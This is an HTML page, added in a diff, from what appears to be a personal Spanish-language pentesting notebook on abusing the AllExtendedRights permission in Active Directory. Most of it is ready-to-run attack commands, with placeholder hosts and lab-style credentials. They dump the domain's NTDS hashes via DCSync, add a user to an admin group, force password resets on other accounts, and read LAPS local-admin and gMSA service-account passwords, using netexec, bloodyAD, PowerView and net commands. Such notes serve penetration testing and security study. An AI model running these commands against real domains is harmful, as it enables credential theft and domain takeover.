@@ -1,0 +1,97 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>AllExtendedRights | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="allextendedrights">
+          <div class="note-tabbar">
+            <span>AllExtendedRights</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Active Directory/Escalada/ACL</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">active directory / escalada / acl</p>
+            <h2>AllExtendedRights</h2>
+
+            <p>AllExtendedRights puede habilitar acciones sensibles sobre objetos, incluyendo cambios de contraseña o permisos específicos según el tipo de objeto.</p>
+
+            <p><span class="notebook-review-note">Info: <code>AllExtendedRights</code>: Dependiendo sobre que objetos tengamos este privilegio se nos dotará de algunos permisos u otros</span></p>
+            <p><span class="notebook-review-note">Aviso: <code>AllExtendedRights</code> sobre <code>Dominio</code> <code>DCSync</code></span></p>
+            <section class="code-card">
+              <h3>Comandos</h3>
+              <pre><code># Ataque Kali: alvaro con permisos DCSync puede dumpear NTDS del DC
+netexec smb &lt;ip_dc&gt; -u &#x27;alvaro&#x27; -p &#x27;alvaro&#x27; --ntds</code></pre>
+            </section>
+            <p><span class="notebook-review-note">Aviso: <code>AllExtendedRights</code>/<code>AddSelf</code> sobre <code>Grupos</code> <code>WriteMember</code>/<code>AddMember</code></span></p>
+            <section class="code-card">
+              <h3>Comandos</h3>
+              <pre><code># Ataque Windows: alvaro con permisos WriteMembers puede agregar a cualquier usuario al grupo &quot;IT-Admins&quot;
+Add-DomainGroupMember -Identity &quot;IT-Admins&quot; -Members &quot;lidia&quot;
+net group &#x27;IT-Admins&#x27; &#x27;lidia&#x27; /add /domain
+# Ataque Kali
+bloodyAD -u &#x27;alvaro&#x27; -p &#x27;alvaro123&#x27; -d &lt;domain&gt; --host &lt;ip_dc&gt; add groupMember &#x27;IT-Admins&#x27; lidia</code></pre>
+            </section>
+            <p><span class="notebook-review-note">Aviso: <code>AllExtendedRights</code> sobre <code>Usuarios</code> <code>ForceChangePassword</code>/<code>ResetPassword</code></span></p>
+            <section class="code-card">
+              <h3>Comandos</h3>
+              <pre><code># Ataque Windows: alvaro puede forzar el cambio de contraseña en lidia
+Set-DomainUserPassword -Identity &quot;lidia&quot; -AccountPassword (ConvertTo-SecureString &quot;NuevaPass123&quot; -AsPlainText -Force)
+net user lidia NewPassword123 /domain
+# Ataque Kali
+nxc smb &lt;dc_ip&gt; -u &#x27;alvaro&#x27; -p &#x27;alvaro123&#x27; -M change-password -o USER=lidia NEWPASS=&#x27;NewPass123&#x27;
+bloodyAD --host &lt;hostname&gt;.&lt;dominio&gt; --dc-ip &lt;ip_dc&gt; -d &quot;&lt;dominio&gt;&quot; -u &#x27;alvaro&#x27; -p &#x27;alvaro123&#x27; set password &#x27;lidia&#x27; &#x27;NewPass123&#x27;</code></pre>
+            </section>
+            <p><span class="notebook-review-note">Aviso: <code>AllExtendedRights</code> sobre <code>Equipos</code></span></p>
+            <p><code>ReadLAPSPassword</code>: Contraseña del <code>Local Admin</code> del equipo</p>
+            <section class="code-card">
+              <h3>Kali: Leer contraseña LAPS</h3>
+              <pre><code>bloodyAD --host &lt;hostname&gt;.&lt;dominio&gt; --dc-ip &lt;ip_dc&gt; -d &quot;&lt;dominio&gt;&quot; -u &#x27;alvaro&#x27; -p &#x27;alvaro123&#x27; get search --filter &#x27;(ms-mcs-admpwdexpirationtime=*)&#x27; --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
+nxc ldap &lt;ip_dc&gt; -u &#x27;alvaro&#x27; -p &#x27;alvaro123&#x27; -M laps</code></pre>
+            </section>
+            <p><code>ReadGMSAPassword</code>: NT hash de <code>Cuentas de Servicio</code> del equipo</p>
+            <section class="code-card">
+              <h3>Kali: Leer contraseña GMSA</h3>
+              <pre><code>bloodyAD --host &lt;hostname&gt;.&lt;dominio&gt; --dc-ip &lt;ip_dc&gt; -d &quot;&lt;dominio&gt;&quot; -u &#x27;alvaro&#x27; -p &#x27;alvaro123&#x27; get object &#x27;TARGET&#x27; --attr msDS-ManagedPassword
+nxc ldap &lt;ip_dc&gt; -u &#x27;alvaro&#x27; -p &#x27;alvaro123&#x27; --gmsa</code></pre>
+            </section>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>ad</span>
+              <span>active_directory</span>
+              <span>escalada</span>
+              <span>acl</span>
+              <span>allextendedrights</span>
+              <span>forcechangepassword</span>
+              <span>readgmsapassword</span>
+              <span>addself</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
